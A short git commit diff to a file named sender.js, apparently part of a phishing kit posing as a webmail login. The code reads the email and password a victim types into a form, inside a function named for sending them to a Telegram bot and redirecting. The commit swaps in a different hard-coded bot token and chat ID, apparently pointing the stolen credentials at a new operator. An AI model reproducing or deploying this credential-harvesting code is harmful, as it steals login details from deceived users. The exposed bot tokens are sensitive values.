c6f8f4450d6a9e3d34b308e379a0852ba1e50473
bellwebmaill <olamayanajamiu@gmail.com>
2024-12-16 06:58:40 -0800

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
-  const chatId = 5710607863; // Replace with your chat ID
+  const telegramBotToken = "7794396444:AAH2qAbRoY70f-4BDFENoAFqtkk6TzcRxhw"; // Replace with your Telegram bot token
+  const chatId = 5605526455; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
